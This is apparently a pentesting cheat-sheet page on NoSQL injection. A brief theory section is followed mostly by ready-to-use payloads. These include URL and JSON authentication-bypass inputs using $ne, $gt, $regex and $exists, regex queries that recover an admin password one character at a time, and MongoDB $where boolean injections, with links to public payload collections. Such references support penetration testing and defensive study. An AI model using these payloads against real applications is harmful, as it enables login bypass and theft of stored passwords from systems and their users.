# NoSQL Injection

## Theory

NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.

## Practice

#### Authentication Bypass

Using not equal ($ne) or greater ($gt) we can try to bypass authentication

{% tabs %}
{% tab title="URL" %}
```
username[$ne]=toto&password[$ne]=toto          #Not Equal
username[$regex]=.*&password[$regex]=.*        #Regex
username[$exists]=true&password[$exists]=true  #If Exist
username[$ne]=admin&password[$gt]=0            #Greater
```
{% endtab %}

{% tab title="JSON" %}
```
{"username": {"$ne": null}, "password": {"$ne": null} }             #Not Equal
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }           #Not Equal
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }   #greater
```
{% endtab %}
{% endtabs %}

#### Extract data

### Extract data
{% tabs %}
{% tab title="URL" %}
We can use regex to find the lenght of a value

```
username[$regex]=.{25}&pass[$ne]=1
```

We can use regex to extract informations.

```
username[$eq]=admin&password[$regex]=^p
username[$eq]=admin&password[$regex]=^pa
username[$eq]=admin&password[$regex]=^pas

username[$ne]=toto&password[$regex]=^p
username[$ne]=toto&password[$regex]=^pa
username[$ne]=toto&password[$regex]=^pas
```

We can use `$nin` (not in) if you don't want to match with some values.

```
#<Matches non of the values of the array> (not test and not admin)
username[$nin][admin]=admin&username[$nin][test]=test&password[$regex]=^p
```

We can use regex to find the lenght of a value

```
{"username": {"$eq": "admin"}, "password": {"$regex": ".{25}" }}
```

We can use regex to extract informations.

```
{"username": {"$eq": "admin"}, "password": {"$regex": "^p" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^pa" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^pas" }}
```

We can use `$nin` (not in) if you don't want to match with some values.

```
#<Matches non of the values of the array> (not test and not admin)
{"username":{"$nin":["admin", "test"]}, "username":{"$regex": "^user" } ,"password":{"$ne":"1"}} 
```

#### &#x20;MangoDB Injection

{% tabs %}
{% tab title="Payloads" %}
You may try to make boolean based injection on MongoDB with following payloads

```
, $where: '1 == 1'
$where: '1 == 1'
' || 1==1//
' || 1==1%00
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://book.hacktricks.xyz/pentesting-web/nosql-injection" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#extract-length-information" %}
